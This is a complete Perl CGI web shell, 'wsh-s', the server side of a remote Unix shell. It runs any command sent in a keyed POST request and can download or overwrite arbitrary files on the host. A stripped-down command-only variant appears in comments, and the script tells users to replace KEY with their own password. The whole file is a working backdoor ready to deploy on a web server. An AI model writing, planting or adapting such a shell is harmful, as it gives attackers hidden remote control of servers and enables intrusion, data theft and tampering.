#!/bin/perl
# wsh-s - cgi based remote unix shell (server part)
# replace KEY with your alpha-numeric key

read(STDIN,my $buffer,$ENV{'CONTENT_LENGTH'});
if ($buffer=~/KEY(.*)/s){my $f=$1;			# <-- replace KEY
if ($f=~/wshget "([^"]+)"(.*)/s){unless (open(F,$1)){                          
print "Content-Type: text/plain\r\n\r\n";exit 0;}                              
print "Content-Type: application/octet-stream\r\n\r\n";                        
while (read(F,my $buf,32768)){print $buf;}close(F);exit 0;}                    
print "Content-Type: text/plain\r\n\r\n";
if ($f=~/wshput "([^"]+)"(.*)/s){my $f2=$2;
unless (open(F,"> $1")){print "$1: $!\n";exit 0;}                              
print F $f2;close(F);exit 0;}print `$1 2>&1`;exit 0;}

# light version, without wshget/wshput support
#
# read(STDIN,my $buffer,$ENV{'CONTENT_LENGTH'});
# if ($buffer=~/KEY(.*)/){				# <-- replace KEY
# print "Content-Type: text/plain\r\n\r\n";
# print `$1 2>&1`;exit 0;}
